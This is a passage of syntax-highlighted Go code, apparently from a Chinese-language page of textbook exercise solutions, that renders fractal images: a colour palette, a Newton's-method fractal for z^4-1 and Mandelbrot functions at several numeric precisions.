punctuation\">,</span>     <span class=\"token comment\">//# blue 4</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">44</span><span class=\"token punctuation\">,</span> <span class=\"token number\">138</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>   <span class=\"token comment\">//# blue 3</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">24</span><span class=\"token punctuation\">,</span> <span class=\"token number\">82</span><span class=\"token punctuation\">,</span> <span class=\"token number\">177</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>   <span class=\"token comment\">//# blue 2</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">57</span><span class=\"token punctuation\">,</span> <span class=\"token number\">125</span><span class=\"token punctuation\">,</span> <span class=\"token number\">209</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\">//# blue 1</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">134</span><span class=\"token punctuation\">,</span> <span class=\"token number\">181</span><span class=\"token punctuation\">,</span> <span class=\"token number\">229</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// # blue 0</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">211</span><span class=\"token punctuation\">,</span> <span class=\"token number\">236</span><span class=\"token punctuation\">,</span> <span class=\"token number\">248</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// # lightest blue</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">241</span><span class=\"token punctuation\">,</span> <span class=\"token number\">233</span><span class=\"token punctuation\">,</span> <span class=\"token number\">191</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// # lightest yellow</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">248</span><span class=\"token punctuation\">,</span> <span class=\"token number\">201</span><span class=\"token punctuation\">,</span> <span class=\"token number\">95</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\">// # light yellow</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token number\">170</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>   <span class=\"token comment\">// # dirty yellow</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">204</span><span class=\"token punctuation\">,</span> <span class=\"token number\">128</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>   <span class=\"token comment\">// # brown 0</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">153</span><span class=\"token punctuation\">,</span> <span class=\"token number\">87</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>    <span class=\"token comment\">// # brown 1</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">106</span><span class=\"token punctuation\">,</span> <span class=\"token number\">52</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>    <span class=\"token comment\">// # brown 2</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">return</span> paletted<span class=\"token punctuation\">[</span>n<span class=\"token operator\">%</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// NOTE: 计算颜色平均值，将r、g、b、a四个的值求平均</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">avg</span><span class=\"token punctuation\">(</span>colors <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>color<span class=\"token punctuation\">.</span>Color<span class=\"token punctuation\">)</span> color<span class=\"token punctuation\">.</span>Color <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">var</span> r<span class=\"token punctuation\">,</span> g<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> a <span class=\"token builtin\">uint16</span>\n\tn <span class=\"token operator\">:=</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>colors<span class=\"token punctuation\">)</span>\n\t<span class=\"token comment\">// 这里的uint32(n)=4，其实就是像素值相加除以4，也就是算平均</span>\n\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> c <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> colors <span class=\"token punctuation\">{</span>\n\t\ttr<span class=\"token punctuation\">,</span> tg<span class=\"token punctuation\">,</span> tb<span class=\"token punctuation\">,</span> ta <span class=\"token operator\">:=</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">RGBA</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\t\tr <span class=\"token operator\">+=</span> <span class=\"token function\">uint16</span><span class=\"token punctuation\">(</span>tr <span class=\"token operator\">/</span> <span class=\"token function\">uint32</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\tg <span class=\"token operator\">+=</span> <span class=\"token function\">uint16</span><span class=\"token punctuation\">(</span>tg <span class=\"token operator\">/</span> <span class=\"token function\">uint32</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\tb <span class=\"token operator\">+=</span> <span class=\"token function\">uint16</span><span class=\"token punctuation\">(</span>tb <span class=\"token operator\">/</span> <span class=\"token function\">uint32</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\ta <span class=\"token operator\">+=</span> <span class=\"token function\">uint16</span><span class=\"token punctuation\">(</span>ta <span class=\"token operator\">/</span> <span class=\"token function\">uint32</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token comment\">// NOTE: type RGBA64 struct {R, G, B, A uint16}</span>\n\t<span class=\"token keyword\">return</span> color<span class=\"token punctuation\">.</span>RGBA64<span class=\"token punctuation\">{</span>r<span class=\"token punctuation\">,</span> g<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><h3>练习 3.7</h3>\n<p>另一个生成分形图像的方式是使用牛顿法来求解一个复数方程，例如$z^4-1=0$。每个起点到四个根的迭代次数对应阴影的灰度。方程根对应的点用颜色表示。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">package</span> main\n\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span>\n\t<span class=\"token string\">\"image\"</span>\n\t<span class=\"token string\">\"image/color\"</span>\n\t<span class=\"token string\">\"image/png\"</span>\n\t<span class=\"token string\">\"math\"</span>\n\t<span class=\"token string\">\"math/cmplx\"</span>\n\t<span class=\"token string\">\"os\"</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">type</span> fn <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">complex128</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">complex128</span>\n\n<span class=\"token keyword\">var</span> colorPool <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>color<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span>\n\t<span class=\"token punctuation\">{</span><span class=\"token number\">170</span><span class=\"token punctuation\">,</span> <span class=\"token number\">57</span><span class=\"token punctuation\">,</span> <span class=\"token number\">57</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token punctuation\">{</span><span class=\"token number\">170</span><span class=\"token punctuation\">,</span> <span class=\"token number\">108</span><span class=\"token punctuation\">,</span> <span class=\"token number\">57</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token punctuation\">{</span><span class=\"token number\">34</span><span class=\"token punctuation\">,</span> <span class=\"token number\">102</span><span class=\"token punctuation\">,</span> <span class=\"token number\">102</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token punctuation\">{</span><span class=\"token number\">45</span><span class=\"token punctuation\">,</span> <span class=\"token number\">136</span><span class=\"token punctuation\">,</span> <span class=\"token number\">45</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">var</span> chosenColors <span class=\"token operator\">=</span> <span class=\"token keyword\">map</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">complex128</span><span class=\"token punctuation\">]</span>color<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">const</span> <span class=\"token punctuation\">(</span>\n\t\txmin<span class=\"token punctuation\">,</span> ymin<span class=\"token punctuation\">,</span> xmax<span class=\"token punctuation\">,</span> ymax <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">+</span><span class=\"token number\">2</span>\n\t\twidth<span class=\"token punctuation\">,</span> height          <span class=\"token operator\">=</span> <span class=\"token number\">1024</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1024</span>\n\t<span class=\"token punctuation\">)</span>\n\timg <span class=\"token operator\">:=</span> image<span class=\"token punctuation\">.</span><span class=\"token function\">NewRGBA</span><span class=\"token punctuation\">(</span>image<span class=\"token punctuation\">.</span><span class=\"token function\">Rect</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> width<span class=\"token punctuation\">,</span> height<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// create a 1024 * 1024 canvas</span>\n\t<span class=\"token keyword\">for</span> py <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> py <span class=\"token operator\">&lt;</span> height<span class=\"token punctuation\">;</span> py<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n\t\ty <span class=\"token operator\">:=</span> <span class=\"token function\">float64</span><span class=\"token punctuation\">(</span>py<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span>height<span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>ymax<span class=\"token operator\">-</span>ymin<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> ymin\n\t\t<span class=\"token keyword\">for</span> px <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> px <span class=\"token operator\">&lt;</span> width<span class=\"token punctuation\">;</span> px<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n\t\t\tx <span class=\"token operator\">:=</span> <span class=\"token function\">float64</span><span class=\"token punctuation\">(</span>px<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span>width<span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>xmax<span class=\"token operator\">-</span>xmin<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> xmin\n\t\t\tz <span class=\"token operator\">:=</span> <span class=\"token function\">complex</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span>\n\t\t\timg<span class=\"token punctuation\">.</span><span class=\"token function\">Set</span><span class=\"token punctuation\">(</span>px<span class=\"token punctuation\">,</span> py<span class=\"token punctuation\">,</span> <span class=\"token function\">z4</span><span class=\"token punctuation\">(</span>z<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// loop every pixels set a specific color</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n\tpng<span class=\"token punctuation\">.</span><span class=\"token function\">Encode</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Stdout<span class=\"token punctuation\">,</span> img<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// NOTE: 牛顿迭代法https://blog.csdn.net/weixin_42943114/article/details/121905957</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">z4</span><span class=\"token punctuation\">(</span>z <span class=\"token builtin\">complex128</span><span class=\"token punctuation\">)</span> color<span class=\"token punctuation\">.</span>Color <span class=\"token punctuation\">{</span>\n\t<span class=\"token comment\">// f(z) = z^4 -1</span>\n\tf <span class=\"token operator\">:=</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span>z <span class=\"token builtin\">complex128</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">complex128</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">return</span> z<span class=\"token operator\">*</span>z<span class=\"token operator\">*</span>z<span class=\"token operator\">*</span>z <span class=\"token operator\">-</span> <span class=\"token number\">1</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token comment\">// f(z)/f'(z) = (z^4 -1)/(4z^3)</span>\n\tfPrime <span class=\"token operator\">:=</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span>z <span class=\"token builtin\">complex128</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">complex128</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>z <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token operator\">/</span><span class=\"token punctuation\">(</span>z<span class=\"token operator\">*</span>z<span class=\"token operator\">*</span>z<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">4</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">return</span> <span class=\"token function\">newton</span><span class=\"token punctuation\">(</span>z<span class=\"token punctuation\">,</span> f<span class=\"token punctuation\">,</span> fPrime<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">newton</span><span class=\"token punctuation\">(</span>z <span class=\"token builtin\">complex128</span><span class=\"token punctuation\">,</span> f fn<span class=\"token punctuation\">,</span> fPrime fn<span class=\"token punctuation\">)</span> color<span class=\"token punctuation\">.</span>Color <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">const</span> iterations <span class=\"token operator\">=</span> <span class=\"token number\">37</span>\n\t<span class=\"token comment\">// const contrast = 7</span>\n\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token function\">uint8</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> iterations<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token comment\">//  牛顿迭代法：f(z+1) = f(z) - f(z)/f'(z)</span>\n\t\tz <span class=\"token operator\">-=</span> <span class=\"token function\">fPrime</span><span class=\"token punctuation\">(</span>z<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">if</span> cmplx<span class=\"token punctuation\">.</span><span class=\"token function\">Abs</span><span class=\"token punctuation\">(</span><span class=\"token function\">f</span><span class=\"token punctuation\">(</span>z<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">1e-6</span> <span class=\"token punctuation\">{</span>\n\t\t\troot <span class=\"token operator\">:=</span> <span class=\"token function\">complex</span><span class=\"token punctuation\">(</span><span class=\"token function\">round</span><span class=\"token punctuation\">(</span><span class=\"token function\">real</span><span class=\"token punctuation\">(</span>z<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">round</span><span class=\"token punctuation\">(</span><span class=\"token function\">imag</span><span class=\"token punctuation\">(</span>z<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t\tc<span class=\"token punctuation\">,</span> ok <span class=\"token operator\">:=</span> chosenColors<span class=\"token punctuation\">[</span>root<span class=\"token punctuation\">]</span>\n\t\t\t<span class=\"token keyword\">if</span> <span class=\"token operator\">!</span>ok <span class=\"token punctuation\">{</span>\n\t\t\t\t<span class=\"token keyword\">if</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>colorPool<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">{</span>\n\t\t\t\t\t<span class=\"token function\">panic</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"no colors left\"</span><span class=\"token punctuation\">)</span>\n\t\t\t\t<span class=\"token punctuation\">}</span>\n\t\t\t\tc <span class=\"token operator\">=</span> colorPool<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n\t\t\t\tcolorPool <span class=\"token operator\">=</span> colorPool<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span>\n\t\t\t\tchosenColors<span class=\"token punctuation\">[</span>root<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> c\n\t\t\t<span class=\"token punctuation\">}</span>\n\t\t\t<span class=\"token comment\">// NOTE: 下面如果处理图像会稍有变化，，见out_1.png</span>\n\t\t\t<span class=\"token comment\">// NOTE: color.RGBToYCbCr将RGB三元组转换为Y’CbCr三元组</span>\n\t\t\ty<span class=\"token punctuation\">,</span> cb<span class=\"token punctuation\">,</span> cr <span class=\"token operator\">:=</span> color<span class=\"token punctuation\">.</span><span class=\"token function\">RGBToYCbCr</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span>R<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">.</span>G<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">.</span>B<span class=\"token punctuation\">)</span>\n\t\t\t<span class=\"token comment\">// NOTE: 求y= y - y*ln(i)/ln(iterations) 亮度调整，每个起点到四个根的迭代次数对应阴影的灰度。</span>\n\t\t\tscale <span class=\"token operator\">:=</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">Log</span><span class=\"token punctuation\">(</span><span class=\"token function\">float64</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">Log</span><span class=\"token punctuation\">(</span>iterations<span class=\"token punctuation\">)</span>\n\t\t\ty <span class=\"token operator\">-=</span> <span class=\"token function\">uint8</span><span class=\"token punctuation\">(</span><span class=\"token function\">float64</span><span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> scale<span class=\"token punctuation\">)</span>\n\t\t\t<span class=\"token keyword\">return</span> color<span class=\"token punctuation\">.</span>YCbCr<span class=\"token punctuation\">{</span>y<span class=\"token punctuation\">,</span> cb<span class=\"token punctuation\">,</span> cr<span class=\"token punctuation\">}</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">return</span> color<span class=\"token punctuation\">.</span>Black\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// TODO: round函数 添加一个小的偏移量，然后保留digits位小数？</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">round</span><span class=\"token punctuation\">(</span>f <span class=\"token builtin\">float64</span><span class=\"token punctuation\">,</span> digits <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">float64</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">if</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">Abs</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0.5</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span>\n\t<span class=\"token punctuation\">}</span>\n\tpow <span class=\"token operator\">:=</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">Pow10</span><span class=\"token punctuation\">(</span>digits<span class=\"token punctuation\">)</span>\n\t<span class=\"token comment\">// NOTE: math.Trunc取整 math.Copysign返回值±0.5，符号取决于f</span>\n\t<span class=\"token keyword\">return</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">Trunc</span><span class=\"token punctuation\">(</span>f<span class=\"token operator\">*</span>pow<span class=\"token operator\">+</span>math<span class=\"token punctuation\">.</span><span class=\"token function\">Copysign</span><span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">,</span> f<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> pow\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><h3>练习 3.8</h3>\n<p>通过提高精度来生成更多级别的分形。使用四种不同精度类型的数字实现相同的分形：complex64、complex128、big.Float和big.Rat。（后面两种类型在math/big包声明。Float是有指定限精度的浮点数；Rat是无限精度的有理数。）它们间的性能和内存使用对比如何？当渲染图可见时缩放的级别是多少？</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">func</span> <span class=\"token function\">mandelbrot128</span><span class=\"token punctuation\">(</span>z <span class=\"token builtin\">complex128</span><span class=\"token punctuation\">)</span> color<span class=\"token punctuation\">.</span>Color <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">const</span> iterations <span class=\"token operator\">=</span> <span class=\"token number\">200</span>\n\t<span class=\"token keyword\">var</span> v <span class=\"token builtin\">complex128</span>\n\t<span class=\"token keyword\">for</span> n <span class=\"token operator\">:=</span> <span class=\"token function\">uint8</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> n <span class=\"token operator\">&lt;</span> iterations<span class=\"token punctuation\">;</span> n<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n\t\tv <span class=\"token operator\">=</span> v<span class=\"token operator\">*</span>v <span class=\"token operator\">+</span> z\n\t\t<span class=\"token keyword\">if</span> cmplx<span class=\"token punctuation\">.</span><span class=\"token function\">Abs</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token keyword\">return</span> <span class=\"token function\">getColor</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">return</span> color<span class=\"token punctuation\">.</span>Black\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">mandelbrot64</span><span class=\"token punctuation\">(</span>z <span class=\"token builtin\">complex128</span><span class=\"token punctuation\">)</span> color<span class=\"token punctuation\">.</span>Color <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">const</span> iterations <span class=\"token operator\">=</span> <span class=\"token number\">200</span>\n\t<span class=\"token keyword\">var</span> v <span class=\"token builtin\">complex64</span>\n\t<span class=\"token keyword\">for</span> n <span class=\"token operator\">:=</span> <span class=\"token function\">uint8</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> n <span class=\"token operator\">&lt;</span> iterations<span class=\"token punctuation\">;</span> n<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n\t\tv <span class=\"token operator\">=</span> v<span class=\"token operator\">*</span>v <span class=\"token operator\">+</span> <span class=\"token function\">complex64</span><span class=\"token punctuation\">(</span>z<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">if</span> cmplx<span class=\"token punctuation\">.</span><span class=\"token function\">Abs</span><span class=\"token punctuation\">(</span><span class=\"token function\">complex128</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token keyword\">return</span> <span class=\"token function\">getColor</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">return</span> color<span class=\"token punctuation\">.</span>Black\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">mandelbrotBigFloat</span><span class=\"token punctuation\">(</span>z <span class=\"token builtin\">complex128</span><span class=\"token punctuation\">)</span> color<span class=\"token punctuation\">.</span>Color <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">const</span> iterations <span class=\"token operator\">=</span> <span class=\"token number\">200</span>\n\tzR <span class=\"token operator\">:=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>big<span class=\"token punctuation\">.</span>Float<span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">SetFloat64</span><span class=\"token punctuation\">(</span><span class=\"token function\">real</span><span class=\"token punctuation\">(</span>z<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\tzI <span class=\"token operator\">:=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>big<span class=\"token punctuation\">.</span>Float<span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">SetFloat64</span><span class=\"token punctuation\">(</span><span class=\"token function\">imag</span><span class=\"token punctuation\">(</span>z<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">var</span> vR<span class=\"token punctuation\">,</span> vI <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>big<span class=\"token punctuation\">.</span>Float<span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>big<span class=\"token punctuation\">.</span>Float<span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token function\">uint8</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> iterations<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n\t\tvR2<span class=\"token punctuation\">,</span> vI2 <span class=\"token operator\">:=</span> <span class=\"token operator\">&amp;</span>big<span class=\"token punctuation\">.</span>Float<span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>big<span class=\"token punctuation\">.</span>Float<span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n\t\tvR2<span class=\"token punctuation\">.</span><span class=\"token function\">Mul</span><span class=\"token punctuation\">(</span>vR<span class=\"token punctuation\">,</span> vR<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Sub</span><span class=\"token punctuation\">(</span>vR2<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>big<span class=\"token punctuation\">.</span>Float<span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Mul</span><span class=\"token punctuation\">(</span>vI<span class=\"token punctuation\">,</span> vI<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span 